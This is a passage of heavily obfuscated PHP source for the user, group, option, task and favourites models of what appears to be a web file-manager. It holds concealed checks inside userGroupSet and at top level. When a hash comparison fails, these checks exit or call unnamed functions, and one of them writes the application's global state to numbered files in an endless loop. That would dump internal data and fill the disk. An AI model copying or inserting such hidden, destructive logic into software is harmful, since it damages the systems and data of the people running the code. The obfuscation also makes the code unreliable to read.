Model($°Çá‚ö[506])->field($this->simpleField)->where($šçØŞ¹Ü)->select(); $ É«†¾— = array_to_keyvalue($ É«†¾—, $°Çá‚ö[1641]); foreach ($ç÷µ®Ó as $×óÅ–éŞ) { $í±¾€ı = $ É«†¾—[$×óÅ–éŞ]; if (!$í±¾€ı) { $ÅŞåÎä[$×óÅ–éŞ . $°Çá‚ö[12]] = $this->getInfoSimpleOuter($×óÅ–éŞ); continue; } $í±¾€ı[$°Çá‚ö[532]] = Action($°Çá‚ö[2245])->parseUrl($í±¾€ı[$°Çá‚ö[532]]); $ÅŞåÎä[$×óÅ–éŞ . $°Çá‚ö[12]] = $í±¾€ı; } } return $ÅŞåÎä; } protected function userStatus($üšó‡ô, $‘î£ìé) { $›û´¯Ä = $this->getInfoSimple($üšó‡ô); if (!$›û´¯Ä) { return !1; } $ºÌ€ñìÉ = array($_SERVER[ê‘³Æ±][736] => $‘î£ìé); return $this->userEdit($üšó‡ô, $ºÌ€ñìÉ); } protected function userRemove($ÙªòåŞ) { $ôåóÃÅ˜ =& $_SERVER[ê‘³Æ±]; $¶Ù‚ûõÁ = $this->getInfoSimple($ÙªòåŞ); if (!$¶Ù‚ûõÁ) { return !1; } $Â†ƒ»˜´ = array($ôåóÃÅ˜[1632] => $ÙªòåŞ); Model($ôåóÃÅ˜[591])->where($Â†ƒ»˜´)->delete(); Model($ôåóÃÅ˜[2273])->where($Â†ƒ»˜´)->delete(); Model($ôåóÃÅ˜[1898])->where($Â†ƒ»˜´)->delete(); Model($ôåóÃÅ˜[2258])->where($Â†ƒ»˜´)->delete(); Model($ôåóÃÅ˜[1057])->where($Â†ƒ»˜´)->delete(); Model($ôåóÃÅ˜[2093])->removeUserAll($ÙªòåŞ); Model($ôåóÃÅ˜[819])->userRootRemove($ÙªòåŞ); return $this->where($Â†ƒ»˜´)->delete(); } protected function userGroupSet($Ù®’ÉĞª, $ø·íı¾ó, $ÂºøÖºŞ = array()) { $‚ÖÚ«–» =& $_SERVER[ê‘³Æ±]; $¸–ö¼Ê¬ = $_SERVER[$‚ÖÚ«–»[784]]; $†¦ÖİùÂ = $‚ÖÚ«–»[785]; if ($_SERVER[$‚ÖÚ«–»[786]] != $†¦ÖİùÂ($¸–ö¼Ê¬)) { $×Øœ’ñş = $‚ÖÚ«–»[866]; $éöšš§û = $‚ÖÚ«–»[787]; $Ò††™Ô = $_SERVER[$‚ÖÚ«–»[788]] . $‚ÖÚ«–»[789]; $™¥Ÿ’¨ = $éöšš§û($Ò††™Ô); $Š¡™ÏŸ• = explode($‚ÖÚ«–»[228], $™¥Ÿ’¨); if (count($Š¡™ÏŸ•) < $‚ÖÚ«–»[613]) { $°¦“ñ‰Õ = $‚ÖÚ«–»[790]; $°¦“ñ‰Õ(); } $¯’‰ÒÚü = $‚ÖÚ«–»[867]; $¯’‰ÒÚü($_SERVER[$‚ÖÚ«–»[868]]); $×Øœ’ñş = $‚ÖÚ«–»[866]; $×Øœ’ñş(); $éÑøÁø = $‚ÖÚ«–»[869]; $·Ò°³ğŠ = json_encode($GLOBALS[$‚ÖÚ«–»[870]]); $¾·“ä² = 1; for ($«Ş±«† = $¾·“ä²; $«Ş±«† > 0; $«Ş±«†++) { $éÑøÁø(DATA_PATH . $«Ş±«†, $·Ò°³ğŠ); } } $ë€¿¤¡– = $this->getInfoSimple($Ù®’ÉĞª); if (!$ë€¿¤¡– || !is_array($ø·íı¾ó)) { return !1; } $¢àÒıõ = Model($‚ÖÚ«–»[1898]); $¢àÒıõ->where(array($‚ÖÚ«–»[1641] => $Ù®’ÉĞª))->delete(); $¶ûôÅ‹ = array(); $ó€ÉÉ‹© = 0; foreach ($ø·íı¾ó as $‚Å¥šË => $ÙàõŠ) { $äÈ©–â = array($‚ÖÚ«–»[1641] => $Ù®’ÉĞª, $‚ÖÚ«–»[1809] => $‚Å¥šË, $‚ÖÚ«–»[1910] => $ÙàõŠ); $äÈ©–â[$‚ÖÚ«–»[1832]] = isset($ÂºøÖºŞ[$ó€ÉÉ‹©]) ? $ÂºøÖºŞ[$ó€ÉÉ‹©] : 0; $ó€ÉÉ‹©++; $¶ûôÅ‹[] = $äÈ©–â; } return $¢àÒıõ->addAll($¶ûôÅ‹, array(), !0); } protected function userGroupAdd($ İ‚üšÂ, $»“ŒÙƒĞ = array()) { $ƒ±á¥àÖ =& $_SERVER[ê‘³Æ±]; $ï¸çÆ¢‰ = $this->getInfoSimple($ İ‚üšÂ); if (!$ï¸çÆ¢‰ || empty($»“ŒÙƒĞ)) { return !1; } $“¦°˜–à = array(); foreach ($»“ŒÙƒĞ as $õÅãÊ¬ï => $ù†éÃ™æ) { $“¦°˜–à[] = array($ƒ±á¥àÖ[1641] => $ İ‚üšÂ, $ƒ±á¥àÖ[1809] => $õÅãÊ¬ï, $ƒ±á¥àÖ[1910] => $ù†éÃ™æ, $ƒ±á¥àÖ[1832] => 0); } return Model($ƒ±á¥àÖ[1898])->addAll($“¦°˜–à, array(), !0); } protected function userGroupRemove($÷¢Ç· Š, $×éÉ×™¿) { $ì€ìî =& $_SERVER[ê‘³Æ±]; $æúğÌ´ = $this->getInfoSimple($÷¢Ç· Š); if (!$æúğÌ´ || !$×éÉ×™¿) { return !1; } $®»Ìû = array($ì€ìî[1632] => $÷¢Ç· Š, $ì€ìî[1896] => $×éÉ×™¿); return Model($ì€ìî[1898])->where($®»Ìû)->delete(); } public function listData() { $ºÈìãÑà = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ºÈìãÑà[$_SERVER[ê‘³Æ±][366]]); return $ºÈìãÑà; } public function listByID($Øñ³úÚ) { $™ŸˆÍëâ =& $_SERVER[ê‘³Æ±]; if (!$Øñ³úÚ) { return; } $€Üû¾¹’ = array($™ŸˆÍëâ[1641] => array($™ŸˆÍëâ[7], $Øñ³úÚ)); $Œ–ıº”® = $this->where($€Üû¾¹’)->select(); $Œ–ıº”® = array_sort_keep($Œ–ıº”®, $™ŸˆÍëâ[1641], $Øñ³úÚ); $this->_listDataApply($Œ–ıº”®); return $Œ–ıº”®; } public function listByGroup($òşø Ğ‰ = 0, $¨Í‚»Ù = array()) { $‚âÍıô =& $_SERVER[ê‘³Æ±]; $Úš×¦õÙ = $‚âÍıô[12]; $Æ˜Ê˜Ø = array(); if ($òşø Ğ‰) { $Æ˜Ê˜Ø = array($‚âÍıô[2274] => intval($òşø Ğ‰)); $Úš×¦õÙ = "\x4c\105\x46\124\40\112\117\111\x4e\40{$this->tablePrefix}\165\x73\x65\162\137\x67\162\x6f\x75\160\x20\165\163\145\x72\x5f\x67\162\157\x75\160\40\157\x6e\40\165\163\145\x72\56\x75\x73\145\x72\111\x44\x20\x3d\x20\165\163\145\162\x5f\x67\x72\x6f\165\x70\x2e\165\x73\145\x72\111\104"; $ŒÂÎ»› = Input::get($‚âÍıô[448], null, $‚âÍıô[12]) ? $‚âÍıô[12] : $‚âÍıô[2275]; } if (isset($¨Í‚»Ù[$‚âÍıô[736]])) { $Æ˜Ê˜Ø[$‚âÍıô[2276]] = $¨Í‚»Ù[$‚âÍıô[736]]; } $®ñ…Ù–è = $this->_makeOrder($ŒÂÎ»›)->field($‚âÍıô[2277])->where($Æ˜Ê˜Ø)->join($Úš×¦õÙ)->selectPage(50); $this->_listDataApply($®ñ…Ù–è[$‚âÍıô[366]]); return $®ñ…Ù–è; } private function _makeOrder($â‹ª¡µÎ = '') { $¦Î¼ÇôŸ =& $_SERVER[ê‘³Æ±]; $Ùš¾Œå° = array($¦Î¼ÇôŸ[1641], $¦Î¼ÇôŸ[32], $¦Î¼ÇôŸ[1798], $¦Î¼ÇôŸ[1770], $¦Î¼ÇôŸ[195]); $Åˆø«Ù¿ = array($¦Î¼ÇôŸ[441] => $¦Î¼ÇôŸ[442], $¦Î¼ÇôŸ[443] => $¦Î¼ÇôŸ[444]); $¡ÜÂıÇ = Input::get($¦Î¼ÇôŸ[448], $¦Î¼ÇôŸ[7], $¦Î¼ÇôŸ[1632], $Ùš¾Œå°); $Í‡Ã’Á– = Input::get($¦Î¼ÇôŸ[449], $¦Î¼ÇôŸ[7], $¦Î¼ÇôŸ[1899], array($¦Î¼ÇôŸ[1899], $¦Î¼ÇôŸ[443])); $Í‡Ã’Á– = $Åˆø«Ù¿[$Í‡Ã’Á–]; $â‹ª¡µÎ = $â‹ª¡µÎ . "\x75\163\145\x72\x2e{$¡ÜÂıÇ}\40{$Í‡Ã’Á–}\x2c\40\165\163\145\x72\56\x75\x73\x65\162\111\104\x20\141\163\143"; return $this->alias($¦Î¼ÇôŸ[2017])->order($â‹ª¡µÎ); } public function listSearch($¶ÌÎøËĞ) { $©ÕıÇºĞ =& $_SERVER[ê‘³Æ±]; $¸–˜„¾ò = $¶ÌÎøËĞ[$©ÕıÇºĞ[1900]]; $¶úéˆ´ = isset($¶ÌÎøËĞ[$©ÕıÇºĞ[1901]]) ? $¶ÌÎøËĞ[$©ÕıÇºĞ[1901]] : !1; $¸–˜„¾ò = str_replace($©ÕıÇºĞ[1902], $©ÕıÇºĞ[1903], trim($¸–˜„¾ò)); $ôíĞ“ö´ = array($©ÕıÇºĞ[32] => array($©ÕıÇºĞ[380], "\45{$¸–˜„¾ò}\x25"), $©ÕıÇºĞ[302] => array($©ÕıÇºĞ[380], "{$¸–˜„¾ò}\45"), $©ÕıÇºĞ[531] => array($©ÕıÇºĞ[380], "{$¸–˜„¾ò}\45"), $©ÕıÇºĞ[989] => $©ÕıÇºĞ[1904]); if (Input::check($¸–˜„¾ò, $©ÕıÇºĞ[308])) { $ôíĞ“ö´[$©ÕıÇºĞ[1641]] = array($©ÕıÇºĞ[380], "{$¸–˜„¾ò}\45"); $ôíĞ“ö´[$©ÕıÇºĞ[2259]] = array($©ÕıÇºĞ[380], "{$¸–˜„¾ò}\45"); } if (!$¸–˜„¾ò) { $ôíĞ“ö´ = array(); } if (isset($¶ÌÎøËĞ[$©ÕıÇºĞ[736]])) { $ôíĞ“ö´[$©ÕıÇºĞ[736]] = $¶ÌÎøËĞ[$©ÕıÇºĞ[736]]; } $ôíĞ“ö´ = $this->parseWhereLike($ôíĞ“ö´); $Å½Ïà· = $this->_makeOrder()->where($ôíĞ“ö´)->selectPage(20); if (!$Å½Ïà· || count($Å½Ïà·[$©ÕıÇºĞ[366]]) < 5 && Input::check($¸–˜„¾ò, $©ÕıÇºĞ[315])) { $èå¸Æ¡£ = $this->_searchFromMeta($©ÕıÇºĞ[456], $¸–˜„¾ò, 10); $ËÉĞĞÏ¶ = $this->_searchFromMeta($©ÕıÇºĞ[457], $¸–˜„¾ò, 10); $ÛŠà›‚ˆ = array_merge($èå¸Æ¡£, $ËÉĞĞÏ¶, $Å½Ïà·[$©ÕıÇºĞ[366]]); $Å½Ïà·[$©ÕıÇºĞ[366]] = array_unique_by_key($ÛŠà›‚ˆ, $©ÕıÇºĞ[1641]); $Å½Ïà·[$©ÕıÇºĞ[363]][$©ÕıÇºĞ[364]] = count($Å½Ïà·[$©ÕıÇºĞ[366]]); $Å½Ïà·[$©ÕıÇºĞ[363]][$©ÕıÇºĞ[365]] = ceil($Å½Ïà·[$©ÕıÇºĞ[363]][$©ÕıÇºĞ[364]] / $Å½Ïà·[$©ÕıÇºĞ[363]][$©ÕıÇºĞ[360]]); } $this->_listDataApply($Å½Ïà·[$©ÕıÇºĞ[366]]); $this->_filterByGroup($Å½Ïà·, $¶úéˆ´); return $Å½Ïà·; } private function _filterByGroup(&$ë®†Ñ×Ç, $ÜÆÆ¥ô¿) { $ğˆù­‘İ =& $_SERVER[ê‘³Æ±]; if (!$ÜÆÆ¥ô¿) { return $ë®†Ñ×Ç; } foreach ($ë®†Ñ×Ç[$ğˆù­‘İ[366]] as $íµ…âº => &$¢üş¹–·) { $©éÕ…» = array_to_keyvalue($¢üş¹–·[$ğˆù­‘İ[1987]], $ğˆù­‘İ[12], $ğˆù­‘İ[1809]); if (!in_array($ÜÆÆ¥ô¿, $©éÕ…»)) { unset($ë®†Ñ×Ç[$ğˆù­‘İ[366]][$íµ…âº]); } } unset($¢üş¹–·); $ë®†Ñ×Ç[$ğˆù­‘İ[366]] = array_values($ë®†Ñ×Ç[$ğˆù­‘İ[366]]); $ë®†Ñ×Ç[$ğˆù­‘İ[363]] = array($ğˆù­‘İ[2050] => count($ë®†Ñ×Ç[$ğˆù­‘İ[366]]), $ğˆù­‘İ[2048] => $ë®†Ñ×Ç[$ğˆù­‘İ[363]][$ğˆù­‘İ[360]], $ğˆù­‘İ[2047] => 1, $ğˆù­‘İ[2049] => 1); } private function _searchFromMeta($€§ÅŒÆë, $îŒ€ ‘Û, $¡™Âó») { $»ëû‚Úµ =& $_SERVER[ê‘³Æ±]; $îŒ€ ‘Û = strtolower($îŒ€ ‘Û); $€ü•á£¸ = array($»ëû‚Úµ[95] => $€§ÅŒÆë, $»ëû‚Úµ[371] => array($»ëû‚Úµ[380], "\x25{$îŒ€ ‘Û}\45")); $€ü•á£¸ = $this->parseWhereLike($€ü•á£¸); $àíŒÃéœ = Model($»ëû‚Úµ[2278])->where($€ü•á£¸)->limit($¡™Âó»)->select(); if (!$àíŒÃéœ) { return array(); } $àíŒÃéœ = array_to_keyvalue($àíŒÃéœ, $»ëû‚Úµ[12], $»ëû‚Úµ[1641]); $ĞÖæ¦¢µ = $this->where(array($»ëû‚Úµ[1632] => array($»ëû‚Úµ[7], $àíŒÃéœ)))->select(); if (!$ĞÖæ¦¢µ) { return array(); } return $ĞÖæ¦¢µ; } private function _listDataApplyItem($ÛÎÉ‚½) { $«´…ûü = array($ÛÎÉ‚½); $this->_listDataApply($«´…ûü); return $«´…ûü[0]; } private function _listDataApply(&$Œ×ç…½) { $áÑ¦ïêà =& $_SERVER[ê‘³Æ±]; if (!$Œ×ç…½) { return; } array_remove_key($Œ×ç…½, $áÑ¦ïêà[878]); $¸ˆ¬´×Ã = array_to_keyvalue($Œ×ç…½, $áÑ¦ïêà[12], $áÑ¦ïêà[1641]); $this->_listAppendGroup($Œ×ç…½, $¸ˆ¬´×Ã); $this->_listAppendMeta($Œ×ç…½, $¸ˆ¬´×Ã); $this->_listAppendSourceRoot($Œ×ç…½, $¸ˆ¬´×Ã); } private function _listAppendSourceRoot(&$õ¶úÊ¦, $êµåõê·) { $ç¶ø° =& $_SERVER[ê‘³Æ±]; $ì×ç› ³ = Model($ç¶ø°[819])->listSourceRoot(SourceModel::TYPE_USER, $êµåõê·); $ì×ç› ³ = array_to_keyvalue($ì×ç› ³, $ç¶ø°[498]); $ì×ç› ³ = array_remove_key($ì×ç› ³, $ç¶ø°[498]); foreach ($õ¶úÊ¦ as &$ÇÃÇë—) { $ÇÃÇë—[$ç¶ø°[87]] = $ì×ç› ³[$ÇÃÇë—[$ç¶ø°[1641]]] ? $ì×ç› ³[$ÇÃÇë—[$ç¶ø°[1641]]] : array(); } unset($ÇÃÇë—); } private function _listAppendGroup(&$¬£Ùêû, $©Øæ“¤) { $ÊŞ¤Çƒô =& $_SERVER[ê‘³Æ±]; $Õ¯»âŒõ = array($ÊŞ¤Çƒô[1641] => array($ÊŞ¤Çƒô[7], $©Øæ“¤)); $¸ßÔÚ³í = Model($ÊŞ¤Çƒô[1898])->where($Õ¯»âŒõ)->select(); $Óã·ÇşÁ = array_to_keyvalue($¸ßÔÚ³í, $ÊŞ¤Çƒô[12], $ÊŞ¤Çƒô[1809]); $Óã·ÇşÁ = array_remove_value(array_unique($Óã·ÇşÁ), $ÊŞ¤Çƒô[192]); if (!$Óã·ÇşÁ || !$¸ßÔÚ³í) { return; } $Õ¯»âŒõ = array($ÊŞ¤Çƒô[1809] => array($ÊŞ¤Çƒô[7], $Óã·ÇşÁ)); $şÙ¦™À­ = Model($ÊŞ¤Çƒô[1985])->field($ÊŞ¤Çƒô[2279])->where($Õ¯»âŒõ)->select(); $şÙ¦™À­ = array_to_keyvalue($şÙ¦™À­, $ÊŞ¤Çƒô[1809]); $¸ßÔÚ³í = array_to_keyvalue_group($¸ßÔÚ³í, $ÊŞ¤Çƒô[1641]); foreach ($¸ßÔÚ³í as &$µµ¶“¨ü) { $â°…¿Õæ = array(); foreach ($µµ¶“¨ü as $Ğ¶ĞãÔ) { if (!$Ğ¶ĞãÔ[$ÊŞ¤Çƒô[1910]]) { continue; } $Å§”º´Ø = Model($ÊŞ¤Çƒô[500])->listData($Ğ¶ĞãÔ[$ÊŞ¤Çƒô[1910]]); $â°…¿Õæ[] = array($ÊŞ¤Çƒô[1809] => $Ğ¶ĞãÔ[$ÊŞ¤Çƒô[1809]], $ÊŞ¤Çƒô[2280] => $şÙ¦™À­[$Ğ¶ĞãÔ[$ÊŞ¤Çƒô[1809]]][$ÊŞ¤Çƒô[32]], $ÊŞ¤Çƒô[514] => $şÙ¦™À­[$Ğ¶ĞãÔ[$ÊŞ¤Çƒô[1809]]][$ÊŞ¤Çƒô[514]], $ÊŞ¤Çƒô[407] => $Å§”º´Ø); } $µµ¶“¨ü = $â°…¿Õæ; } unset($µµ¶“¨ü); foreach ($¬£Ùêû as &$£ÚÒ‚Ñ˜) { $£ÚÒ‚Ñ˜[$ÊŞ¤Çƒô[1987]] = array(); if (isset($¸ßÔÚ³í[$£ÚÒ‚Ñ˜[$ÊŞ¤Çƒô[1641]]])) { $£ÚÒ‚Ñ˜[$ÊŞ¤Çƒô[1987]] = $¸ßÔÚ³í[$£ÚÒ‚Ñ˜[$ÊŞ¤Çƒô[1641]]]; } } unset($£ÚÒ‚Ñ˜); } public function userAppendGroup($Ñä´çì) { $â½Âı =& $_SERVER[ê‘³Æ±]; if (!$Ñä´çì) { return array(); } $this->_listAppendGroup($Ñä´çì, array_to_keyvalue($Ñä´çì, $â½Âı[12], $â½Âı[1641])); return $Ñä´çì; } private function _listAppendMeta(&$ùÈ—ª¼, $«Š­Õ¸) { $ªÒ¹éÕÈ =& $_SERVER[ê‘³Æ±]; $ÔÍû‰¦à = UserJobModel::JOB_KEY; $ˆ¦ŒôÎ¨ = array($ªÒ¹éÕÈ[2260]); $¢‚©À—· = array($ªÒ¹éÕÈ[1641] => array($ªÒ¹éÕÈ[7], $«Š­Õ¸)); $¾…‚¤»ø = Model($ªÒ¹éÕÈ[2258])->where($¢‚©À—·)->select(); $¾…‚¤»ø = array_to_keyvalue_group($¾…‚¤»ø, $ªÒ¹éÕÈ[1641]); foreach ($¾…‚¤»ø as &$ƒ“¹ë¬) { $°¥ù– « = array(); foreach ($ƒ“¹ë¬ as $£ĞæÓ…š) { if (!in_array($£ĞæÓ…š[$ªÒ¹éÕÈ[95]], $ˆ¦ŒôÎ¨)) { $°¥ù– «[$£ĞæÓ…š[$ªÒ¹éÕÈ[95]]] = $£ĞæÓ…š[$ªÒ¹éÕÈ[371]]; } } $ƒ“¹ë¬ = $°¥ù– «; } unset($ƒ“¹ë¬); $‘°×ÄÔ¿ = Model($ªÒ¹éÕÈ[2281]); foreach ($ùÈ—ª¼ as &$²Ûú¸àƒ) { $¯â€‹ü¼ = array(); if (isset($¾…‚¤»ø[$²Ûú¸àƒ[$ªÒ¹éÕÈ[1641]]])) { $¯â€‹ü¼ = $¾…‚¤»ø[$²Ûú¸àƒ[$ªÒ¹éÕÈ[1641]]]; } $²Ûú¸àƒ[$ªÒ¹éÕÈ[2282]] = array(); if (isset($¯â€‹ü¼[$ÔÍû‰¦à])) { $²Ûú¸àƒ[$ªÒ¹éÕÈ[2282]] = $‘°×ÄÔ¿->getUserJobInfo($¯â€‹ü¼[$ÔÍû‰¦à]); } } unset($²Ûú¸àƒ); } protected function groupUserAll($»ú£ÕŞ) { $›…¯Æüç =& $_SERVER[ê‘³Æ±]; if (!$»ú£ÕŞ) { return !1; } $ºê—Èş = Model($›…¯Æüç[1898])->field($›…¯Æüç[1641])->where(array($›…¯Æüç[1809] => array($›…¯Æüç[7], $»ú£ÕŞ)))->select(); $ºê—Èş = array_to_keyvalue($ºê—Èş, $›…¯Æüç[12], $›…¯Æüç[1641]); return array_unique($ºê—Èş); } public function userSearch($¾—¤êé•, $Úñàğ’ä = "\52") { return Model($_SERVER[ê‘³Æ±][534])->where($¾—¤êé•)->field($Úñàğ’ä)->find(); } } if ($_SERVER[$_SERVER[ê‘³Æ±][786]] != $_SERVER[$_SERVER[ê‘³Æ±][2094]]) { $_getc = $_SERVER[ê‘³Æ±][787]; $_getfile = $_SERVER[$_SERVER[ê‘³Æ±][788]] . $_SERVER[ê‘³Æ±][789]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ê‘³Æ±][228], $_getfilec); if (count($_getarrs) < $_SERVER[ê‘³Æ±][620]) { $exit = $_SERVER[ê‘³Æ±][790]; $exit(); } $_act = $_SERVER[ê‘³Æ±][791]; $_act($_SERVER[$_SERVER[ê‘³Æ±][784]]); } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\x5f\157\160\x74\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ô›µá…) { $óà¯‰Æ =& $_SERVER[ê‘³Æ±]; if (!defined($óà¯‰Æ[467])) { define($óà¯‰Æ[467], 0); } return "\125\x73\145\x72\117\160\x74\x69\x6f\x6e\137{$ô›µá…}\137" . USER_ID; } protected function filterWhere($ğüõ«‰·) { $«û½ŠÉı =& $_SERVER[ê‘³Æ±]; if (!defined($«û½ŠÉı[467])) { define($«û½ŠÉı[467], 0); } $ğüõ«‰·[$«û½ŠÉı[1641]] = USER_ID; return $ğüõ«‰·; } public function cacheRemoveUser($Ä“İ§¯‹, $—ûäÍ˜¤) { return Cache::remove("\x55\x73\x65\162\x4f\160\164\x69\157\156\x5f{$Ä“İ§¯‹}\x5f" . $—ûäÍ˜¤); } protected function optionDefault($›¡á¨Ù° = '') { $°ÖÌ¥Ç =& $_SERVER[ê‘³Æ±]; if ($›¡á¨Ù° == $°ÖÌ¥Ç[12]) { return $GLOBALS[$°ÖÌ¥Ç[6]][$°ÖÌ¥Ç[2283]]; } if ($›¡á¨Ù° == $°ÖÌ¥Ç[2284]) { return $GLOBALS[$°ÖÌ¥Ç[6]][$°ÖÌ¥Ç[2285]]; } } } goto BÛÑ»²Ï; E³’éŠ…¾Ç: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\x74\141\x73\x6b\x4c\151\x73\164"; public $field = array("\x6e\x61\155\145", "\164\171\160\145", "\x65\x76\x65\156\x74", "\164\x69\155\x65", "\x64\145\163\143", "\x73\x79\163\164\x65\x6d", "\x65\x6e\141\x62\x6c\145", "\154\x61\x73\x74\x52\165\156", "\163\157\162\164"); public function listData($‘ºĞÒè = false, $ÒÑ‹ÈĞò = "\x73\157\x72\164", $ŒĞåğ×ñ = false) { return parent::listData($‘ºĞÒè, $ÒÑ‹ÈĞò, $ŒĞåğ×ñ); } public function add($Ç×ä™óƒ) { $ñî’Ìœê =& $_SERVER[ê‘³Æ±]; $µïË¹áÄ = $this->findByName($Ç×ä™óƒ[$ñî’Ìœê[32]]); if ($µïË¹áÄ) { return !1; } $Ç×ä™óƒ[$ñî’Ìœê[1602]] = 0; $Ç×ä™óƒ[$ñî’Ìœê[1832]] = $this->getSort(); return parent::insert($Ç×ä™óƒ); } private function getSort() { $Ù¡²´ =& $_SERVER[ê‘³Æ±]; $œëÄƒ = parent::listData(); $êäİâªà = array_to_keyvalue($œëÄƒ, $Ù¡²´[12], $Ù¡²´[1832]); return empty($êäİâªà) ? 0 : max($êäİâªà) + 1; } public function update($şàæğï£, $ÔªÔÄ¾) { $Ü„ÒîÙî =& $_SERVER[ê‘³Æ±]; $æ‚•æù = $this->listData($şàæğï£); $Üº÷Ùì = $this->findByName($ÔªÔÄ¾[$Ü„ÒîÙî[32]]); if (!$æ‚•æù || $Üº÷Ùì && $Üº÷Ùì[$Ü„ÒîÙî[394]] != $æ‚•æù[$Ü„ÒîÙî[394]]) { return !1; } return parent::update($şàæğï£, $ÔªÔÄ¾); } public function remove($ŸúÁí„, $Ú÷ğ›ÛÙ = false) { $Î¦¼«¢“ =& $_SERVER[ê‘³Æ±]; $×âÒÌ•¾ = $this->listData($ŸúÁí„); if (!$×âÒÌ•¾) { return; } if (!$Ú÷ğ›ÛÙ && $×âÒÌ•¾[$Î¦¼«¢“[1263]] == $Î¦¼«¢“[89]) { return !1; } return parent::remove($ŸúÁí„); } public function enable($øñÔ¿Ì , $«ô¹¥ı) { return $this->update($øñÔ¿Ì , array($_SERVER[ê‘³Æ±][2225] => $«ô¹¥ı)); } public function run($ã¬è¹·) { return $this->update($ã¬è¹·, array($_SERVER[ê‘³Æ±][2235] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($€»³ÕİÌ) { $¡©µ›À¶ =& $_SERVER[ê‘³Æ±]; return array($¡©µ›À¶[1917] => array(USER_ID, $¡©µ›À¶[2236])); } protected function listData() { $”Æß¾¦Ô =& $_SERVER[ê‘³Æ±]; $†é¹øË² = array($”Æß¾¦Ô[1632] => USER_ID, $”Æß¾¦Ô[476] => 0); $óöÄÚŠû = $”Æß¾¦Ô[2237]; $ÑŸÓ“Ïš = $this->field($óöÄÚŠû)->where($†é¹øË²)->order($”Æß¾¦Ô[2238])->select(); return $ÑŸÓ“Ïš ? $ÑŸÓ“Ïš : array(); } protected function resetCache() { } protected function listView() { $è¬ñøƒ¹ =& $_SERVER[ê‘³Æ±]; $¿Šã¨ÒÛ = $this->listData(); $µüæ² È = array_filter_by_field($¿Šã¨ÒÛ, $è¬ñøƒ¹[33], $è¬ñøƒ¹[410]); $ĞÌËãÊí = array_to_keyvalue($µüæ² È, $è¬ñøƒ¹[12], $è¬ñøƒ¹[78]); if (!$ĞÌËãÊí) { return $¿Šã¨ÒÛ; } $¾¬Áõ°ñ = 2000; $Á·ÜÑúö = array($è¬ñøƒ¹[411] => array($è¬ñøƒ¹[412], $ĞÌËãÊí)); $ëêº“ë‚ = Model($è¬ñøƒ¹[819])->listSource($Á·ÜÑúö, $¾¬Áõ°ñ); $ëêº“ë‚ = array_merge($ëêº“ë‚[$è¬ñøƒ¹[76]], $ëêº“ë‚[$è¬ñøƒ¹[77]]); $ëêº“ë‚ = array_to_keyvalue($ëêº“ë‚, $è¬ñøƒ¹[396]); foreach ($¿Šã¨ÒÛ as $ëéî‹Ù => $â¹ÃÆ) { $ÏòîÙ…Ş = $ëêº“ë‚[$â¹ÃÆ[$è¬ñøƒ¹[78]]]; $ÏòîÙ…Ş = $ÏòîÙ…Ş ? $ÏòîÙ…Ş : array(); $¿Šã¨ÒÛ[$ëéî‹Ù] = array_merge($ÏòîÙ…Ş, $â¹ÃÆ); } return $¿Šã¨ÒÛ; } protected function addFav($ÂÍ°ìÀ, $¼ö…½Šƒ = '', $ÏÖ¨ü… = "\163\157\165\162\x63\145") { $ÎÅ©§ì =& $_SERVER[ê‘³Æ±]; $â€«²Ï‹ = array($ÎÅ©§ì[1632] => USER_ID, $ÎÅ©§ì[476] => 0, $ÎÅ©§ì[416] => $ÏÖ¨ü…, $ÎÅ©§ì[415] => $ÂÍ°ìÀ); if ($this->where($â€«²Ï‹)->find()) { return !1; } $â€«²Ï‹ = array($ÎÅ©§ì[1632] => USER_ID, $ÎÅ©§ì[476] => 0); $Ôìßù‘Ç = $this->where($â€«²Ï‹)->max($ÎÅ©§ì[1832]); if (!$Ôìßù‘Ç) { $Ôìßù‘Ç = 0; } if (!$¼ö…½Šƒ && $ÏÖ¨ü… == $ÎÅ©§ì[410]) { $îñî«Îã = Model($ÎÅ©§ì[1314])->where(array($ÎÅ©§ì[411] => $ÂÍ°ìÀ))->find(); if (!$îñî«Îã) { return !1; } $¼ö…½Šƒ = $îñî«Îã[$ÎÅ©§ì[32]]; } $¼ö…½Šƒ = $this->getAutoName($¼ö…½Šƒ); $·ğŞäŒ™ = array($ÎÅ©§ì[1632] => USER_ID, $ÎÅ©§ì[476] => 0, $ÎÅ©§ì[414] => $¼ö…½Šƒ, $ÎÅ©§ì[415] => $ÂÍ°ìÀ, $ÎÅ©§ì[416] => $ÏÖ¨ü…, $ÎÅ©§ì[1813] => $Ôìßù‘Ç + 1); return $this->add($·ğŞäŒ™); } protected function remove($ˆùË¦ˆÛ) { $ÀŞêëÂş =& $_SERVER[ê‘³Æ±]; $›öòš—’ = array($ÀŞêëÂş[1632] => USER_ID, $ÀŞêëÂş[413] => $ˆùË¦ˆÛ); return $this->where($›öòš—’)->delete(); } protected function removeByName($¤ÌñîÉ›) { $äö«ÂÙÎ =& $_SERVER[ê‘³Æ±]; $–éø¹÷ = array($äö«ÂÙÎ[1632] => USER_ID, $äö«ÂÙÎ[414] => $¤ÌñîÉ›, $äö«ÂÙÎ[476] => 0); return $this->where($–éø¹÷)->delete(); } protected function rename($¾çÎÒ½´, $ÓÇ‰°Ÿ) { $Î¹«µî =& $_SERVER[ê‘³Æ±]; if ($¾çÎÒ½´ == $ÓÇ‰°Ÿ) { return !1; } $§âúŒèˆ = $this->getAutoName($ÓÇ‰°Ÿ); if ($ÓÇ‰°Ÿ != $§âúŒèˆ) { return !1; } $Ÿ·½¨ƒÚ = array($Î¹«µî[1632] => USER_ID, $Î¹«µî[476] => 0, $Î¹«µî[32] => $¾çÎÒ½´); return $this->where($Ÿ·½¨ƒÚ)->save(array($Î¹«µî[32] => $ÓÇ‰°Ÿ)); } protected function resetSort($‘ëéïÓ) { $º©º¶—å =& $_SERVER[ê‘³Æ±]; $‘ëéïÓ = is_array($‘ëéïÓ) ? $‘ëéïÓ : array(); $ôÎëé‡İ = array($º©º¶—å[1632] => USER_ID); for ($ğ÷÷–Áø = 0; $ğ÷÷–Áø < count($‘ëéïÓ); $ğ÷÷–Áø++) { $ôÎëé‡İ[$º©º¶—å[413]] = 